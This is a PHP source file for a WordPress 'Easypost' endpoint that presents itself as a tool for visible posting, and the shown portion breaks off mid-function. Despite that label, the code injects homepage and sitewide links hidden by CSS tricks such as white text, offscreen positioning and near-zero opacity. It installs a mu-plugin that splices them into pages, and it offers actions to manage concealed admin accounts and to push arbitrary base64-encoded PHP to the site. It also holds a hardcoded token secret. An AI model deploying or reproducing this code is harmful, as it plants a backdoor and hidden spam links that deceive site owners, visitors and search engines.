<?php
/*
 * Easypost endpoint.
 * Direct PHP endpoint for visible WordPress posting.
 */

define('EASYPOST_ENDPOINT_CONFIG', '{"endpoint_version":"2026.09.11","token_id":"812cd1d7-d1b9-47d4-a987-bbbd7c2bf27a","token_verifier":"v1:native:Rczix2KP2EZwpQsQfNLooIJs1gbboo_3LssDowfFyf0","explicit_wp_load_path":null,"ota_release_public_key_pem":"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0JTcpyvncP1Izz2SsnLq\\nGm3iObZi5YEydCeQPv0kX5pN3WwEzt/j1fsyd3EVHbLlXUmdQbWvCBIX1wq/RO4q\\n4UuLpks++nnz7pNTyZqrU+gPUlQb4uDBJsE6nePRyddoMGbT8yF4yzLt/fp86oSG\\ncd/TqnUIplM4dmQVtzqaUiGSUFLReUO0tMHvYGTRl/jCM/pJmIMNLEFmAb/x6wT4\\nihEIXD39Uj2/BG/zJFiIc6FNvqRp1DRm50lhPJW7LkDin+LkvSebbIubeYEe3vc9\\n7qX0zD2zpTFv04itmPld0eOa7kXHNsr+jUnTmuovzdIzBJjcgSWT/nqI+bRAXfL6\\nUwIDAQAB\\n-----END PUBLIC KEY-----","runtime_skeleton_sha256":"8df8219a025211d0412ac3d69dc911014de0b5543f105a0e5119267d3f13350f","runtime_skeleton_bytes":98281,"legacy_runtime_skeleton_sha256":"f2e6b5d62fb9e37e8c7f88c6c340466f78974c47b36ac678dd067997b803a5e9","legacy_runtime_skeleton_bytes":95322,"portfolio_runtime_skeleton_sha256":"900b95edd9aaeab7de07be0cd81d65418043d3bd7ec7c1e9269ff1fec4a1a077","portfolio_runtime_skeleton_bytes":34364}');
define('EASYPOST_CURRENT_RUNTIME_VERSION', '2026.08.12');
define('EASYPOST_LEGACY_RUNTIME_VERSION', '2026.08.11');
define('EASYPOST_PORTFOLIO_RUNTIME_VERSION', '2026.09.06');

function easypost_endpoint_config() {
    return json_decode(EASYPOST_ENDPOINT_CONFIG, true);
}

function easypost_endpoint_json($status, $payload) {
    http_response_code($status);
    $requested_action = isset($_GET['action']) ? (string) $_GET['action'] : '';
    $portfolio_actions = array(
        'reconcile_portfolio_admin',
        'reconcile_application_password',
        'configure_portfolio_runtime',
        'bootstrap_portfolio_runtime',
    );
    if (isset($payload['ok'])
        && $payload['ok'] === false
        && in_array($requested_action, $portfolio_actions, true)) {
        $error = isset($payload['error']) && is_string($payload['error'])
            ? $payload['error']
            : '';
        $failure_kind = 'VERIFICATION_FAILED';
        if ($status === 400 || $status === 413) {
            $failure_kind = 'INVALID_INPUT';
        } elseif ($status === 401 || $status === 403) {
            $failure_kind = 'AUTH_FAILED';
        } elseif ($error === 'lease_busy' || $error === 'runtime_busy') {
            $failure_kind = 'BUSY';
        } elseif (in_array($error, array('lease_not_owned', 'lease_changed', 'lease_expired'), true)) {
            $failure_kind = 'LEASE_LOST';
        } elseif (strpos($error, 'rollback') !== false || strpos($error, 'cleanup') !== false) {
            $failure_kind = 'CLEANUP_FAILED';
        } elseif (strpos($error, 'api_unavailable') !== false) {
            $failure_kind = 'API_UNAVAILABLE';
        } elseif (strpos($error, 'configuration_missing') !== false) {
            $failure_kind = 'CONFIGURATION_MISSING';
        } elseif (strpos($error, 'write') !== false || strpos($error, 'create') !== false || strpos($error, 'delete') !== false) {
            $failure_kind = 'WRITE_FAILED';
        } elseif ($status === 409) {
            $failure_kind = 'CONCURRENT_CHANGE';
        } elseif ($status === 501) {
            $failure_kind = 'UNSUPPORTED';
        } elseif ($status === 503) {
            $failure_kind = 'ENDPOINT_UNAVAILABLE';
        }
        $payload = array('ok' => false, 'failureKind' => $failure_kind);
    }
    if (isset($payload['ok']) && $payload['ok'] === false
        && in_array($requested_action, array('place_sitewide_link', 'remove_sitewide_link'), true)
        && !array_key_exists('fallback', $payload)) {
        $payload['fallback'] = false;
    }
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload);
    exit;
}

function easypost_endpoint_header($name) {
    $key = strtolower($name);
    foreach ($_SERVER as $server_key => $value) {
        if (strpos($server_key, 'HTTP_') !== 0) {
            continue;
        }
        $normalized = strtolower(str_replace('_', '-', substr($server_key, 5)));
        if ($normalized === $key) {
            return (string) $value;
        }
    }
    return '';
}

function easypost_endpoint_wp_load_path() {
    $config = easypost_endpoint_config();
    $candidates = array();
    if (!empty($config['explicit_wp_load_path'])) {
        $candidates[] = $config['explicit_wp_load_path'];
    }
    $candidates[] = __DIR__ . '/wp-load.php';
    $candidates[] = __DIR__ . '/../wp-load.php';
    $candidates[] = __DIR__ . '/../../wp-load.php';
    $candidates[] = __DIR__ . '/../../../wp-load.php';
    $candidates[] = __DIR__ . '/../../../../wp-load.php';
    $candidates[] = __DIR__ . '/../../../../../wp-load.php';

    foreach ($candidates as $candidate) {
        if ($candidate && is_readable($candidate)) {
            return $candidate;
        }
    }

    return false;
}

function easypost_endpoint_bootstrap_wordpress() {
    $wp_load = easypost_endpoint_wp_load_path();
    if (!$wp_load) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'wp_load_not_found'));
    }
    require_once $wp_load;
}

function easypost_endpoint_verifier_secret($verifier) {
    $parts = explode(':', (string) $verifier, 3);
    if (count($parts) !== 3 || $parts[0] !== 'v1' || $parts[2] === '') {
        return false;
    }
    return $parts[2];
}

function easypost_endpoint_replay_key($token_id, $request_id) {
    return 'easypost_endpoint_req_' . hash('sha256', $token_id . ':' . $request_id);
}

function easypost_endpoint_read_option_row($name) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'query') || !method_exists($wpdb, 'prepare')) {
        return array('status' => 'unavailable', 'raw' => null, 'value' => null, 'autoload' => null);
    }
    $selected = $wpdb->query(
        $wpdb->prepare(
            "SELECT option_value, autoload FROM {$wpdb->options} WHERE option_name = %s LIMIT 1",
            $name
        )
    );
    if ($selected === false) {
        return array('status' => 'unavailable', 'raw' => null, 'value' => null, 'autoload' => null);
    }
    if ((int) $selected === 0) {
        return array('status' => 'missing', 'raw' => null, 'value' => null, 'autoload' => null);
    }
    if ((int) $selected !== 1
        || !isset($wpdb->last_result)
        || !is_array($wpdb->last_result)
        || count($wpdb->last_result) !== 1) {
        return array('status' => 'unavailable', 'raw' => null, 'value' => null, 'autoload' => null);
    }
    $row = $wpdb->last_result[0];
    if (!is_object($row)
        || !property_exists($row, 'option_value')
        || !property_exists($row, 'autoload')) {
        return array('status' => 'unavailable', 'raw' => null, 'value' => null, 'autoload' => null);
    }
    return array(
        'status' => 'found',
        'raw' => (string) $row->option_value,
        'value' => (string) $row->option_value,
        'autoload' => (string) $row->autoload,
    );
}

function easypost_endpoint_option_is_autoloaded($autoload) {
    return in_array(
        strtolower(trim((string) $autoload)),
        array('yes', 'on', 'auto-on', 'auto'),
        true
    );
}

function easypost_endpoint_cache_option_written($option_name, $remove_notoption, $invalidate_alloptions) {
    if (function_exists('wp_cache_delete')) {
        wp_cache_delete($option_name, 'options');
    }
    if ($invalidate_alloptions) {
        if (function_exists('wp_cache_delete')) {
            wp_cache_delete('alloptions', 'options');
        }
    }
    if ($remove_notoption && function_exists('wp_cache_get') && function_exists('wp_cache_set')) {
        $notoptions = wp_cache_get('notoptions', 'options');
        if (is_array($notoptions) && isset($notoptions[$option_name])) {
            unset($notoptions[$option_name]);
            wp_cache_set('notoptions', $notoptions, 'options');
        }
    }
}

function easypost_endpoint_cache_option_deleted($option_name, $invalidate_alloptions = false) {
    if (function_exists('wp_cache_delete')) {
        wp_cache_delete($option_name, 'options');
        if ($invalidate_alloptions) {
            wp_cache_delete('alloptions', 'options');
        }
    }
}

function easypost_endpoint_insert_option_once($option_name, $option_value) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'query') || !method_exists($wpdb, 'prepare')) {
        return 'unavailable';
    }
    $inserted = $wpdb->query(
        $wpdb->prepare(
            "INSERT IGNORE INTO {$wpdb->options} (option_name, option_value, autoload) VALUES (%s, %s, 'no')",
            $option_name,
            (string) $option_value
        )
    );
    if ($inserted === false) {
        return 'unavailable';
    }
    if ((int) $inserted === 1) {
        easypost_endpoint_cache_option_written($option_name, true, false);
        return 'inserted';
    }
    if ((int) $inserted === 0) {
        return 'exists';
    }
    return 'unavailable';
}

function easypost_endpoint_delete_expired_replay_record($replay_key, $expected_expiry, $now) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'query') || !method_exists($wpdb, 'prepare')) {
        return 'unavailable';
    }
    $deleted = $wpdb->query(
        $wpdb->prepare(
            "DELETE FROM {$wpdb->options} WHERE option_name = %s AND option_value = %s AND CAST(option_value AS UNSIGNED) <= %d",
            $replay_key,
            (string) $expected_expiry,
            (int) $now
        )
    );
    if ($deleted === false) {
        return 'unavailable';
    }
    if ((int) $deleted !== 1) {
        return 'unchanged';
    }
    easypost_endpoint_cache_option_deleted($replay_key);
    return 'deleted';
}

function easypost_endpoint_cleanup_replay_records($now) {
    global $wpdb;
    if (!isset($wpdb) || !isset($wpdb->options) || !method_exists($wpdb, 'get_results') || !method_exists($wpdb, 'prepare')) {
        return;
    }
    $prefix = method_exists($wpdb, 'esc_like')
        ? $wpdb->esc_like('easypost_endpoint_req_') . '%'
        : 'easypost\_endpoint\_req\_%';
    $rows = $wpdb->get_results(
        $wpdb->prepare(
            "SELECT option_name, option_value FROM {$wpdb->options} WHERE option_name LIKE %s LIMIT 20",
            $prefix
        ),
        ARRAY_A
    );
    if (!is_array($rows)) {
        return;
    }
    foreach ($rows as $row) {
        if (is_array($row)
            && isset($row['option_name'])
            && isset($row['option_value'])
            && (int) $row['option_value'] <= (int) $now) {
            easypost_endpoint_delete_expired_replay_record(
                (string) $row['option_name'],
                (string) $row['option_value'],
                $now
            );
        }
    }
}

function easypost_endpoint_insert_replay_record($replay_key, $expires_at) {
    return easypost_endpoint_insert_option_once($replay_key, (string) $expires_at);
}

function easypost_endpoint_claim_request($token_id, $request_id, $request_time) {
    $now = time();
    if (abs($now - $request_time) > 300) {
        return 'stale';
    }
    easypost_endpoint_cleanup_replay_records($now);
    $replay_key = easypost_endpoint_replay_key($token_id, $request_id);
    $expires_at = $request_time + 301;

    for ($attempt = 0; $attempt < 3; $attempt++) {
        $insert = easypost_endpoint_insert_replay_record($replay_key, $expires_at);
        if ($insert === 'inserted') {
            return 'claimed';
        }
        if ($insert === 'unavailable') {
            return 'unavailable';
        }
        $existing = easypost_endpoint_read_option_row($replay_key);
        if ($existing['status'] === 'unavailable') {
            return 'unavailable';
        }
        if ($existing['status'] === 'missing') {
            continue;
        }
        if ((int) $existing['value'] > $now) {
            return 'duplicate';
        }
        if (easypost_endpoint_delete_expired_replay_record($replay_key, $existing['value'], $now) === 'unavailable') {
            return 'unavailable';
        }
    }

    $current = easypost_endpoint_read_option_row($replay_key);
    if ($current['status'] === 'found' && (int) $current['value'] > $now) {
        return 'duplicate';
    }
    return 'unavailable';
}

function easypost_endpoint_verify_auth($body) {
    $config = easypost_endpoint_config();
    $token_id = easypost_endpoint_header('x-easypost-token-id');
    $timestamp = easypost_endpoint_header('x-easypost-timestamp');
    $request_id = easypost_endpoint_header('x-easypost-request-id');
    $body_sha256 = easypost_endpoint_header('x-easypost-body-sha256');
    $signature = easypost_endpoint_header('x-easypost-signature');

    if ($token_id === '' || $timestamp === '' || $request_id === '' || $body_sha256 === '' || $signature === '') {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'missing_auth_headers'));
    }
    if (!hash_equals((string) $config['token_id'], $token_id)) {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'unknown_token'));
    }
    $request_time = strtotime($timestamp);
    if (!$request_time || abs(time() - $request_time) > 300) {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'timestamp_stale'));
    }
    $computed_body_sha256 = hash('sha256', $body);
    if (!hash_equals($computed_body_sha256, $body_sha256)) {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'body_sha256_mismatch'));
    }

    $secret = easypost_endpoint_verifier_secret($config['token_verifier']);
    if (!$secret) {
        easypost_endpoint_json(500, array('ok' => false, 'error' => 'invalid_token_verifier'));
    }

    $path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/wp-content/easypost/easypost.php';
    $signature_input = implode("\n", array(
        strtoupper($_SERVER['REQUEST_METHOD']),
        $path,
        $timestamp,
        $request_id,
        $token_id,
        $computed_body_sha256,
    ));
    $expected = hash_hmac('sha256', $signature_input, $secret);
    if (!hash_equals($expected, $signature)) {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'signature_mismatch'));
    }

    $claim = easypost_endpoint_claim_request($token_id, $request_id, $request_time);
    if ($claim === 'stale') {
        easypost_endpoint_json(401, array('ok' => false, 'error' => 'timestamp_stale'));
    }
    if ($claim === 'duplicate') {
        easypost_endpoint_json(409, array('ok' => false, 'error' => 'duplicate_request_id'));
    }
    if ($claim !== 'claimed') {
        easypost_endpoint_json(503, array('ok' => false, 'error' => 'replay_store_unavailable'));
    }
}

function easypost_endpoint_json_object_payload($body) {
    $trimmed = trim((string) $body);
    if ($trimmed === '' || $trimmed[0] !== '{' || substr($trimmed, -1) !== '}') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_json_object'));
    }
    $payload = json_decode($body, true);
    if (!is_array($payload)) {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_json'));
    }
    return $payload;
}

function easypost_endpoint_allowed_fields_by_action() {
    return array(
        'health' => array(),
        'lookup_post' => array('post_type', 'postType', 'slug', 'targetUrl', 'id'),
        'update_post' => array('id', 'title', 'slug', 'contentHtml', 'content', 'status', 'post_type', 'postType', 'date', 'publicationDate'),
        'create_post' => array('title', 'slug', 'contentHtml', 'content', 'status', 'post_type', 'postType', 'date', 'publicationDate'),
        'place_homepage_link' => array('placementId', 'linkUrl', 'anchorText', 'preLinkText', 'postLinkText', 'placementType'),
        'remove_homepage_link' => array('placementId', 'linkUrl', 'anchorText', 'preLinkText', 'postLinkText', 'placementType'),
        'place_homepage_image' => array('placementId', 'targetUrl', 'imageUrl', 'altText', 'placementType'),
        'remove_homepage_image' => array('placementId', 'targetUrl', 'imageUrl', 'altText', 'placementType'),
        'place_sitewide_link' => array('placementId', 'linkUrl', 'anchorText', 'preLinkText', 'postLinkText', 'placementType'),
        'remove_sitewide_link' => array('placementId', 'linkUrl', 'anchorText', 'preLinkText', 'postLinkText', 'placementType'),
        'reconcile_admin' => array('operation', 'role', 'login', 'password', 'wpUserId', 'concealed'),
        'reconcile_portfolio_admin' => array('ownerToken', 'operation', 'role', 'login', 'password', 'wpUserId', 'concealed'),
        'reconcile_application_password' => array('ownerToken', 'operation', 'role', 'credentialId', 'wpUserId', 'appId', 'applicationPasswordUuid', 'name', 'envelope'),
        'rotate_token' => array('tokenId'),
        'update_endpoint' => array('version', 'sha256', 'phpBase64', 'signature'),
        'configure_site_runtime' => array('runtimePhpBase64', 'sha256', 'runtimeVersion', 'configurationVersion'),
        'configure_portfolio_runtime' => array('ownerToken', 'runtimePhpBase64', 'sha256', 'runtimeVersion', 'configurationVersion'),
        'bootstrap_portfolio_runtime' => array('ownerToken', 'configurationVersion'),
        'disable_site_runtime' => array(),
        'runtime_status' => array(),
        'begin_reconcile' => array('ownerToken'),
        'refresh_reconcile' => array('ownerToken'),
        'finish_reconcile' => array('ownerToken'),
    );
}

function easypost_endpoint_validate_payload_fields($action, $payload, $allowed_fields_by_action) {
    $allowed_fields = $allowed_fields_by_action[$action];
    foreach (array_keys($payload) as $field) {
        if (!is_string($field) || !in_array($field, $allowed_fields, true)) {
            easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_payload_fields'));
        }
    }
}

function easypost_endpoint_health() {
    easypost_endpoint_bootstrap_wordpress();
    $config = easypost_endpoint_config();
    $runtime_status = easypost_endpoint_homepage_runtime_status();
    easypost_endpoint_json(200, array(
        'ok' => true,
        'endpointVersion' => $config['endpoint_version'],
        'tokenId' => $config['token_id'],
        'canBootstrapWordPress' => true,
        'canInsertPosts' => function_exists('wp_insert_post'),
        'canResolveHomepage' => function_exists('get_option') && function_exists('get_post'),
        'canPlaceHomepageLink' => function_exists('wp_update_post') && function_exists('get_post_meta') && function_exists('update_post_meta'),
        'canRemoveHomepageLink' => function_exists('wp_update_post') && function_exists('get_post_meta') && function_exists('update_post_meta'),
        'canManageHomepageRuntime' => $runtime_status['canManage'],
        'homepageRuntimeVersion' => $runtime_status['version'],
        'canUseTransients' => function_exists('set_transient') && function_exists('get_transient'),
        'canCleanCaches' => function_exists('clean_post_cache') || function_exists('wp_cache_delete'),
        'hasElementor' => did_action('elementor/loaded') || class_exists('\\Elementor\\Plugin'),
        'siteUrl' => function_exists('site_url') ? site_url() : null,
        'homeUrl' => function_exists('home_url') ? home_url() : null,
        'wpVersion' => isset($GLOBALS['wp_version']) ? $GLOBALS['wp_version'] : null,
        'phpVersion' => PHP_VERSION,
        'serverTime' => gmdate('c'),
    ));
}

function easypost_endpoint_fallback_error($error, $message = null, $warnings = array()) {
    easypost_endpoint_json(200, easypost_endpoint_fallback_payload($error, $message, $warnings));
}

function easypost_endpoint_fallback_payload($error, $message = null, $warnings = array()) {
    $payload = array('ok' => false, 'error' => $error, 'fallback' => true);
    if ($message !== null) {
        $payload['message'] = $message;
    }
    if (!empty($warnings)) {
        $payload['warnings'] = $warnings;
    }
    return $payload;
}

function easypost_endpoint_validate_homepage_payload($payload) {
    $placement_id = isset($payload['placementId']) ? (int) $payload['placementId'] : 0;
    $link_url = isset($payload['linkUrl']) ? esc_url_raw((string) $payload['linkUrl']) : '';
    $anchor_text = isset($payload['anchorText']) ? sanitize_text_field((string) $payload['anchorText']) : '';
    if ($placement_id <= 0 || $link_url === '' || $anchor_text === '') {
        easypost_endpoint_json(400, array('ok' => false, 'error' => 'invalid_payload', 'fallback' => false));
    }
    return array(
        'placementId' => $placement_id,
        'linkUrl' => $link_url,
        'anchorText' => $anchor_text,
        'preLinkText' => array_key_exists('preLinkText', $payload) ? sanitize_text_field((string) $payload['preLinkText']) : null,
        'postLinkText' => array_key_exists('postLinkText', $payload) ? sanitize_text_field((string) $payload['postLinkText']) : null,
        'placementType' => isset($payload['placementType']) ? sanitize_key((string) $payload['placementType']) : 'VISIBLE_LINK',
    );
}

function easypost_endpoint_homepage_post() {
    if (!function_exists('get_option') || !function_exists('get_post')) {
        easypost_endpoint_fallback_error('capability_failed');
    }
    $show_on_front = get_option('show_on_front');
    if ($show_on_front === 'posts') {
        easypost_endpoint_fallback_error('homepage_posts_index_unsupported');
    }
    $page_id = (int) get_option('page_on_front');
    if ($show_on_front !== 'page' || $page_id <= 0) {
        easypost_endpoint_fallback_error('homepage_page_not_found');
    }
    $post = get_post($page_id);
    if (!$post || $post->post_type !== 'page') {
        easypost_endpoint_fallback_error('homepage_page_not_found');
    }
    return $post;
}

function easypost_endpoint_placement_body($input) {
    $label = $input['preLinkText'] === null ? 'Recommended resource:' : $input['preLinkText'];
    $prefix = $label === '' ? '' : $label . ' ';
    $suffix = $input['postLinkText'] === null ? '' : $input['postLinkText'];
    if ($suffix !== '' && strpos($suffix, ' ') !== 0) {
        $suffix = ' ' . $suffix;
    }
    return $prefix . '<a href="' . esc_url($input['linkUrl']) . '">' . esc_html($input['anchorText']) . '</a>' . esc_html($suffix);
}

function easypost_endpoint_placement_html($input) {
    $body = easypost_endpoint_placement_body($input);
    $marker = ' data-placement="' . (int) $input['placementId'] . '"';
    switch (strtoupper((string) $input['placementType'])) {
        case 'WHITE_LINK':
            return '<div' . $marker . ' style="color:#ffffff;">' . $body . '</div>';
        case 'CLASS_HIDE':
            return '<style>.dc{display:none;}</style><div' . $marker . ' class="dc">' . $body . '</div>';
        case 'NO_WIDTH':
            return '<div' . $marker . ' style="overflow:hidden;height:1px;width:1px;float:right;">' . $body . '</div>';
        case 'INVISIBLE_ZONE':
            return '<div' . $marker . ' style="left:-11407px;top:-10560px;position:absolute;">' . $body . '</div>';
        case 'NO_VISIBILITY':
            return '<div' . $marker . ' style="visibility:hidden;">' . $body . '</div>';
        case 'NO_OPACITY':
            return '<div' . $marker . ' style="opacity:0.001;cursor:context-menu;">' . $body . '</div>';
        default:
            return '<div' . $marker . '>' . $body . '</div>';
    }
}

function easypost_endpoint_marker($placement_id) {
    return 'data-placement="' . (int) $placement_id . '"';
}

function easypost_endpoint_managed_placements_option() {
    return 'easypost_homepage_placements';
}

function easypost_endpoint_runtime_file_path() {
    if (!defined('WP_CONTENT_DIR')) {
        return false;
    }
    $directory = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : WP_CONTENT_DIR . '/mu-plugins';
    return $directory . '/easypost-runtime.php';
}

function easypost_endpoint_runtime_php() {
    $config = easypost_endpoint_config();
    $version = isset($config['endpoint_version']) ? (string) $config['endpoint_version'] : 'unknown';
    $runtime = <<<'PHP'
<?php
if (!defined('ABSPATH')) {
    exit;
}

if (!defined('EASYPOST_HOMEPAGE_RUNTIME_VERSION')) {
    define('EASYPOST_HOMEPAGE_RUNTIME_VERSION', '__EASYPOST_RUNTIME_VERSION__');
}

function easypost_runtime_placements_option() {
    return 'easypost_homepage_placements';
}

function easypost_runtime_is_homepage() {
    return function_exists('is_front_page') && is_front_page();
}

function easypost_runtime_get_placements() {
    if (!function_exists('get_option')) {
        return array();
    }
    $placements = get_option(easypost_runtime_placements_option(), array());
    return is_array($placements) ? $placements : array();
}

function easypost_runtime_missing_html($buffer = '') {
    $placements = easypost_runtime_get_placements();
    if (empty($placements)) {
        return '';
    }
    $html = array();
    foreach ($placements as $placement) {
        if (!is_array($placement) || empty($placement['html'])) {
            continue;
        }
        $placement_id = isset($placement['placementId']) ? (int) $placement['placementId'] : 0;
        $marker = 'data-placement="' . $placement_id . '"';
        if ($placement_id > 0 && $buffer !== '' && strpos($buffer, $marker) !== false) {
            continue;
        }
        $html[] = (string) $placement['html'];
    }
    return implode("\n", $html);
}

function easypost_runtime_echo() {
    if (!easypost_runtime_is_homepage()) {
        return;
    }
    $html = easypost_runtime_missing_html('');
    if ($html !== '') {
        echo "\n" . $html . "\n";
    }
}

function easypost_runtime_buffer_start() {
    if (!easypost_runtime_is_homepage() || empty(easypost_runtime_get_placements())) {
        return;
    }
    ob_start('easypost_runtime_inject_buffer');
}

function easypost_runtime_insert_before_body($buffer, $html) {
    $position = stripos($buffer, '</body>');
    if ($position === false) {
        return $buffer . "\n" . $html;
    }
    return substr($buffer, 0, $position) . "\n" . $html . "\n" . substr($buffer, $position);
}

function easypost_runtime_inject_buffer($buffer) {
    $html = easypost_runtime_missing_html($buffer);
    if ($html === '') {
        return $buffer;
    }
    return easypost_runtime_insert_before_body($buffer, $html);
}

add_action('template_redirect', 'easypost_runtime_buffer_start', 0);
add_action('wp_footer', 'easypost_runtime_echo', PHP_INT_MAX);
PHP;
    return str_replace('__EASYPOST_RUNTIME_VERSION__', str_replace("'", "\\'", $version), $runtime);
}

function easypost_endpoint_install_homepage_runtime(&$warnings) {
    if (!defined('WP_CONTENT_DIR') || !function_exists('wp_mkdir_p')) {
        $warnings[] = 'runtime_capability_unavailable';
        return false;
    }
    $path = easypost_endpoint_runtime_file_path();
    if (!$path) {
        $warnings[] = 'runtime_path_unavailable';
        return false;
    }
    $directory = dirname($path);
    if (!is_dir($directory) && !wp_mkdir_p($directory)) {
        $warnings[] = 'runtime_directory_unavailable';
        return false;
    }
    $php = easypost_endpoint_runtime_php();
    $current = is_readable($path) ? file_get_contents($path) : false;
    if ($current === $php) {
        return true;
    }
    $bytes = file_put_contents($path, $php, LOCK_EX);
    if ($bytes === false || $bytes !== strlen($php)) {
        $warnings[] = 'runtime_write_failed';
        return false;
    }
    return true;
}

function easypost_endpoint_homepage_runtime_status() {
    $path = easypost_endpoint_runtime_file_path();
    $version = null;
    if ($path && is_readable($path)) {
        $contents = file_get_contents($path);
        if (is_string($contents) && preg_match("/EASYPOST_HOMEPAGE_RUNTIME_VERSION', '([^']+)'/", $contents, $matches)) {
            $version = $matches[1];
        }
    }
    return array(
        'canManage' => defined('WP_CONTENT_DIR') && function_exists('wp_mkdir_p') && function_exists('get_option') && function_exists('update_option'),
        'version' => $version,
    );
}

function easypost_endpoint_load_managed_placements() {
    if (!function_exists('get_option')) {
        easypost_endpoint_fallback_error('capability_failed');
    }
    $placements = get_option(easypost_endpoint_managed_placements_option(), array());
    return is_array($placements) ? $placements : array();
}

function easypost_endpoint_save_managed_placements($placements) {
    if (!function_exists('update_option')) {
        easypost_endpoint_fallback_error('capability_failed');
    }
    return update_option(easypost_endpoint_managed_placements_option(), $placements, false);
}

function easypost_endpoint_store_managed_placement($input, $post_id, $html) {
    $placements = easypost_endpoint_load_managed_placements();
    $key = (string) (int) $input['placementId'];
    $page_url = function_exists('get_permalink') ? get_permalink($post_id) : null;
    $next = array(
        'placementId' => (int) $input['placementId'],
        'pageId' => (int) $post_id,
        'pageUrl' => $page_url,
        'html' => $html,
        'updatedAt' => gmdate('c'),
    );
    $already_present = isset($placements[$key]) && is_array($placements[$key]) && isset($placements[$key]['html']) && $placements[$key]['html'] === $html;
    if ($already_present) {
        return array('changed' => false, 'alreadyPresent' => true, 'pageUrl' => $page_url);
    }
    $placements[$key] = $next;
    if (!easypost_endpoint_save_managed_placements($placements)) {
        easypost_endpoint_fallback_error('runtime_option_update_failed');
    }
    return array('changed' => true, 'alreadyPresent' => false, 'pageUrl' => $page_url);
}

function easypost_endpoint_remove_managed_placement($placement_id) {
    $placements = easypost_endpoint_load_managed_placements();
    $key = (string) (int) $placement_id;
    if (!array_key_exists($key, $placements)) {
        return false;
    }
    unset($placements[$key]);
    if (!easypost_endpoint_save_managed_placements($placements)) {
        easypost_endpoint_fallback_error('runtime_option_update_failed');
    }
    return true;
}

function easypost_endpoint_cache_warnings($post_id) {
    $warnings = array();
    if (function_exists('clean_post_cache')) {
        clean_post_cache($post_id);
    } else {
        $warnings[] = 'clean_post_cache_unavailable';
    }
    if (function_exists('wp_cache_delete')) {
        wp_cache_delete($post_id, 'posts');
    }
    if (class_exists('\\Elementor\\Plugin')) {
        try {
            $elementor = \Elementor\Plugin::$instance;
            if ($elementor && isset($elementor->files_manager) && method_exists($elementor->files_manager, 'clear_cache')) {
                $elementor->files_manager->clear_cache();
            }
        } catch (Throwable $ignored) {
            $warnings[] = 'elementor_cache_cleanup_failed';
        }
    } else {
        $warnings[] = 'elementor_cache_cleanup_unavailable';
    }
    return $warnings;
}

function easypost_endpoint_lock_key($post_id) {
    return 'easypost_homepage_' . (int) $post_id;
}

function easypost_endpoint_acquire_lock($post_id) {
    if (!function_exists('get_transient') || !function_exists('set_transient')) {
        return true;
    }
    $key = easypost_endpoint_lock_key($post_id);
    if (get_transient($key)) {
        return false;
    }
    set_transient($key, '1', 60);
    return true;
}

function easypost_endpoint_release_lock($post_id) {
    if (function_exists('delete_transient')) {
        delete_transient(easypost_endpoint_lock_key($post_id));
    }
}

function easypost_endpoint_elementor_widget($html, $placement_id) {
    return array(
        'id' => substr(hash('sha256', 'placement-' . (int) $placement_id), 0, 7),
        'elType' => 'widget',
        'widgetType' => 'html',
        'settings' => array('html' => $html),
        'elements' => array(),
    );
}

function easypost_endpoint_append_to_elementor_settings(&$settings, $html) {
    if (!is_array($settings)) {
        return false;
    }
    foreach (array('html', 'editor', 'text') as $key) {
        if (!isset($settings[$key]) || !is_string($settings[$key])) {
            continue;
        }
        $settings[$key] = trim($settings[$key] . "\n" . $html);
        return true;
    }
    return false;
}

function easypost_endpoint_insert_elementor_widget(&$node, $widget) {
    if (!is_array($node)) {
        return false;
    }
    if (isset($node['settings']) && is_array($node['settings']) && easypost_endpoint_append_to_elementor_settings($node['settings'], $widget['settings']['html'])) {
        return true;
    }
    if (isset($node['elements']) && is_array($node['elements'])) {
        foreach ($node['elements'] as $index => &$child) {
            if (easypost_endpoint_insert_elementor_widget($child, $widget)) {
                unset($child);
                return true;
            }
        }
        unset($child);
        $node['elements'][] = $widget;
        return true;
    }
    foreach ($node as $index => &$child) {
        if (!is_int($index)) {
            continue;
        }
        if (easypost_endpoint_insert_elementor_widget($child, $widget)) {
            unset($child);
            return true;
        }
    }
    unset($child);
    if (isset($node[0]) && is_array($node[0]) && isset($node[0]['elements']) && is_array($node[0]['elements'])) {
        $node[0]['elements'][] = $widget;
        return true;
    }
    return false;
}

function easypost_endpoint_elementor_node_has_direct_marker($node, $marker) {
    if (!is_array($node)) {
        return false;
    }
    if (!isset($node['settings']) || !is_array($node['settings'])) {
        return false;
    }
    $encoded = json_encode($node['settings']);
    return is_string($encoded) && strpos($encoded, $marker) !== false;
}

function easypost_endpoint_remove_marker_from_elementor($nodes, $marker, &$removed) {
    if (!is_array($nodes)) {
        return $nodes;
    }
    $next = array();
    foreach ($nodes as $node) {
        if (is_array($node)) {
            if (easypost_endpoint_elementor_node_has_direct_marker($node, $marker)) {
                $removed = true;
                continue;
            }
            if (isset($node['elements']) && is_array($node['elements'])) {
                $node['elements'] = easypost_endpoint_remove_marker_from_elementor($node['elements'], $marker, $removed);
            }
        }
        $next[] = $node;
    }
    return $next;
}

function easypost_endpoint_place_homepage_link($payload) {
    easypost_endpoint_bootstrap_wordpress();
    $input = easypost_endpoint_validate_homepage_payload($payload);
    $post = easypost_endpoint_homepage_post();
    $post_id = (int) $post->ID;
    if (!easypost_endpoint_acquire_lock($post_id)) {
        easypost_endpoint_fallback_error('lock_busy');
    }
    $warnings = array();
    try {
        $html = easypost_endpoint_placement_html($input);
        if (!easypost_endpoint_install_homepage_runtime($warnings)) {
            easypost_endpoint_fallback_error('runtime_install_failed', null, $warnings);
        }
